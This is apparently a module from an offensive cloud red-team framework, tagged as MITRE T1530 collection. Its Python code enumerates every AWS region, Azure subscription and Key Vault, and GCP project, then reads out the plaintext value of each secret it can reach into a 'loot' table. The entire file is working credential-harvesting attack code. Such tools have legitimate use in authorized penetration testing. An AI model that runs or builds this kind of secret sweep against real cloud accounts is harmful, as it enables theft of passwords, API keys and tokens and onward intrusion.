# ================================================================
# TECHNIQUE: collection/get_secrets
# ----------------------------------------------------------------
# TACTIC:    Collection (TA0009)
# TECHNIQUE: T1530 — Data from Cloud Storage (Applied to Secrets)
#
# PURPOSE:
#   Retrieve secret values from cloud secret management services.
#   These secrets often include database passwords, API keys,
#   service account credentials, and application tokens.
#
# PROVIDERS: aws, azure, gcp, oci
#
# HOW IT WORKS:
#   Azure — Requires Key Vault data-plane list/get permissions and
#           uses KeyVaultManagementClient plus SecretClient to
#           locate vault URIs and retrieve secret payloads.
#   GCP   — Uses Secret Manager control plane to inventory secrets
#           and then accesses the latest or requested secret version.
#
# SAFE:      Yes
# ================================================================

from __future__ import annotations

import base64
import logging
from typing import Any

from quantum_mechanic.core.context import ExecutionContext
from quantum_mechanic.core.technique import Parameter, technique

logger = logging.getLogger(__name__)

try:
    from google.cloud import resourcemanager_v3, secretmanager
except ImportError:
    resourcemanager_v3 = None  # type: ignore[assignment]
    secretmanager = None  # type: ignore[assignment]

# ----------------------------------------------------------------
# Loot schema — Declarative table mapping
# ----------------------------------------------------------------
LOOT_ITEMS_KEY = "secrets"
LOOT_SCHEMA = [
    ("vault", "Vault/Manager", "bold cyan"),
    ("name", "Secret Name", "white"),
    ("value", "Value", "yellow"),
    ("content_type", "Content Type", "dim"),
]


@technique(
    technique_id="collection/get_secrets",
    tactic="collection",
    mitre_id="T1530",
    providers=["aws", "azure", "gcp", "oci"],
    severity="high",
    safe=True,
    description="Retrieve secrets from cloud secret managers.",
    loot_schema=LOOT_SCHEMA,
    loot_items_key=LOOT_ITEMS_KEY,
    parameters=[
        Parameter(
            "target",
            "A specific vault, manager, or project secret container to search.",
            required=False,
        ),
        Parameter("secret_name", "A specific secret name to retrieve.", required=False),
    ],
)
def execute(ctx: ExecutionContext) -> dict[str, Any]:
    """Retrieve secrets from cloud secret managers."""
    return run_secret_collection(ctx)


def run_secret_collection(ctx: ExecutionContext) -> dict[str, Any]:
    """Dispatch cross-provider secret retrieval to the correct provider branch."""
    if ctx.provider_name == "aws":
        return _aws(ctx)
    if ctx.provider_name == "azure":
        return _azure(ctx)
    if ctx.provider_name == "gcp":
        return _gcp(ctx)
    if ctx.provider_name == "oci":
        return _oci(ctx)

    return {"error": f"Provider {ctx.provider_name} not implemented.", "secrets": []}


def _aws(ctx: ExecutionContext) -> dict[str, Any]:
    """Retrieve AWS Secrets Manager secret payloads."""
    target = ctx.get_param("target")
    secret_name_param = ctx.get_param("secret_name")
    session = ctx.session
    secrets: list[dict[str, Any]] = []

    try:
        regions = session.get_available_regions("secretsmanager")
    except Exception:
        regions = [getattr(session, "region_name", None) or "us-east-1"]

    for region in sorted(set(regions)):
        try:
            client = session.client("secretsmanager", region_name=region)
            next_token = None
            while True:
                kwargs = {"NextToken": next_token} if next_token else {}
                response = client.list_secrets(**kwargs)
                for secret in response.get("SecretList", []):
                    name = secret.get("Name")
                    arn = secret.get("ARN", "")
                    if not name:
                        continue
                    if target and target not in {name, arn}:
                        continue
                    if secret_name_param and secret_name_param not in {name, arn}:
                        continue

                    try:
                        value_resp = client.get_secret_value(SecretId=arn or name)
                        if "SecretString" in value_resp:
                            value = value_resp["SecretString"]
                            content_type = "text/plain"
                        else:
                            value = base64.b64encode(
                                value_resp.get("SecretBinary", b"")
                            ).decode("ascii")
                            content_type = "binary/base64"
                    except Exception as e:
                        ctx.warn(f"Failed to access secret {name} in region {region}: {e}")
                        value = "[ACCESS DENIED]"
                        content_type = "Unknown"

                    secrets.append({
                        "vault": region,
                        "name": name,
                        "value": value,
                        "content_type": content_type,
                    })

                next_token = response.get("NextToken")
                if not next_token:
                    break
        except Exception as e:
            ctx.warn(f"Failed to list Secrets Manager secrets in region {region}: {e}")

    return {
        "provider": "aws",
        "secrets": secrets,
        "count": len(secrets),
    }


def _azure(ctx: ExecutionContext) -> dict[str, Any]:
    """Retrieve Azure Key Vault secrets."""
    try:
        from azure.core.exceptions import ClientAuthenticationError, ResourceNotFoundError
        from azure.keyvault.secrets import SecretClient
        from azure.mgmt.keyvault import KeyVaultManagementClient
        from azure.mgmt.subscription import SubscriptionClient
    except ImportError:
        return {
            "error": "azure-mgmt-keyvault or azure-keyvault-secrets not installed.",
            "secrets": [],
        }

    target = ctx.get_param("target")
    secret_name_param = ctx.get_param("secret_name")
    cred = ctx.session
    secrets = []

    vault_uris = []
    try:
        if target:
            if target.startswith("https://") and ".vault.azure.net" in target:
                vault_uris.append((target.split("//")[1].split(".")[0], target))
            else:
                sub_client = SubscriptionClient(cred)
                for sub in sub_client.subscriptions.list():
                    try:
                        kv_client = KeyVaultManagementClient(cred, sub.subscription_id)
                        for vault in kv_client.vaults.list():
                            if vault.name != target:
                                continue

                            full_vault = vault
                            if (
                                not getattr(vault, "properties", None)
                                or not getattr(vault.properties, "vault_uri", None)
                            ):
                                try:
                                    rg = vault.id.split("/")[4]
                                    full_vault = kv_client.vaults.get(rg, vault.name)
                                except Exception as e:
                                    logger.debug(
                                        "Failed to get properties for vault %s: %s",
                                        vault.name,
                                        e,
                                    )

                            vault_uris.append((full_vault.name, full_vault.properties.vault_uri))
                            break
                    except Exception as e:
                        logger.debug("Failed listing vaults: %s", e)
                        continue
        else:
            sub_client = SubscriptionClient(cred)
            for sub in sub_client.subscriptions.list():
                try:
                    kv_client = KeyVaultManagementClient(cred, sub.subscription_id)
                    for vault in kv_client.vaults.list():
                        full_vault = vault
                        if (
                            not getattr(vault, "properties", None)
                            or not getattr(vault.properties, "vault_uri", None)
                        ):
                            try:
                                rg = vault.id.split("/")[4]
                                full_vault = kv_client.vaults.get(rg, vault.name)
                            except Exception as e:
                                logger.debug(
                                    "Failed to get properties for vault %s: %s",
                                    vault.name,
                                    e,
                                )

                        vault_uris.append((full_vault.name, full_vault.properties.vault_uri))
                except Exception as e:
                    ctx.warn(f"Failed to list vaults in sub {sub.subscription_id}: {e}")
    except Exception as e:
        return {"error": f"Discovery failed: {e}", "secrets": []}

    for vault_name, vault_uri in vault_uris:
        ctx.info(f"Azure: Accessing vault {vault_name} ({vault_uri})...")
        try:
            client = SecretClient(vault_url=vault_uri, credential=cred)

            if secret_name_param:
                try:
                    secret = client.get_secret(secret_name_param)
                    secrets.append({
                        "vault": vault_name,
                        "name": secret.name,
                        "value": secret.value,
                        "content_type": secret.properties.content_type or "Unknown",
                    })
                except ResourceNotFoundError:
                    ctx.warn(f"Secret {secret_name_param} not found in vault {vault_name}.")
                except ClientAuthenticationError:
                    ctx.warn(f"Access denied to secret {secret_name_param} in vault {vault_name}.")
            else:
                try:
                    for secret_prop in client.list_properties_of_secrets():
                        try:
                            secret = client.get_secret(secret_prop.name)
                            secrets.append({
                                "vault": vault_name,
                                "name": secret.name,
                                "value": secret.value,
                                "content_type": secret.properties.content_type or "Unknown",
                            })
                        except ClientAuthenticationError:
                            secrets.append({
                                "vault": vault_name,
                                "name": secret_prop.name,
                                "value": "[ACCESS DENIED]",
                                "content_type": secret_prop.content_type or "Unknown",
                            })
                except ClientAuthenticationError:
                    ctx.warn(f"Access denied listing secrets in vault {vault_name}.")

        except Exception as e:
            logger.debug("Failed to connect to vault %s: %s", vault_name, e)

    return {
        "provider": "azure",
        "secrets": secrets,
        "count": len(secrets),
    }


def _gcp(ctx: ExecutionContext) -> dict[str, Any]:
    """Retrieve GCP Secret Manager secret payloads."""
    if secretmanager is None or resourcemanager_v3 is None:
        return {
            "error": (
                "google-cloud-secret-manager or google-cloud-resource-manager "
                "package is not installed."
            ),
            "secrets": [],
        }

    target = ctx.get_param("target")
    secret_name_param = ctx.get_param("secret_name")
    whoami_res = ctx.whoami()
    projects: list[str] = []
    secrets: list[dict[str, Any]] = []

    try:
        project_client = resourcemanager_v3.ProjectsClient(credentials=ctx.session)
        for project in project_client.search_projects():
            if getattr(project, "project_id", None):
                projects.append(project.project_id)
    except Exception as e:
        ctx.warn(f"Could not list projects via Resource Manager: {e}")

    if not projects and whoami_res.account_id and whoami_res.account_id != "unknown":
        projects.append(whoami_res.account_id)

    if not projects:
        return {
            "error": "No projects found and no default project available.",
            "secrets": [],
        }

    client = secretmanager.SecretManagerServiceClient(credentials=ctx.session)

    for project_id in sorted(set(projects)):
        try:
            for secret in client.list_secrets(request={"parent": f"projects/{project_id}"}):
                secret_name = secret.name.split("/")[-1]
                if target and secret_name != target:
                    continue
                if secret_name_param and secret_name != secret_name_param:
                    continue

                version_name = f"{secret.name}/versions/latest"
                try:
                    version = client.access_secret_version(request={"name": version_name})
                    payload = version.payload.data.decode("utf-8", errors="replace")
                    content_type = getattr(secret, "annotations", {}) or {}
                    inferred_type = content_type.get("content_type", "Unknown")
                except Exception as e:
                    ctx.warn(f"Failed to access secret {secret_name} in project {project_id}: {e}")
                    payload = "[ACCESS DENIED]"
                    inferred_type = "Unknown"

                secrets.append({
                    "vault": project_id,
                    "name": secret_name,
                    "value": payload,
                    "content_type": inferred_type,
                })
        except Exception as e:
            ctx.warn(f"Failed to list Secret Manager secrets in project {project_id}: {e}")

    return {
        "provider": "gcp",
        "secrets": secrets,
        "count": len(secrets),
    }


def _oci(ctx: ExecutionContext) -> dict[str, Any]:
    # TODO: Implement OCI Vault retrieval
    return {"provider": "oci", "secrets": [], "note": "OCI Vault secrets implementation pending."}
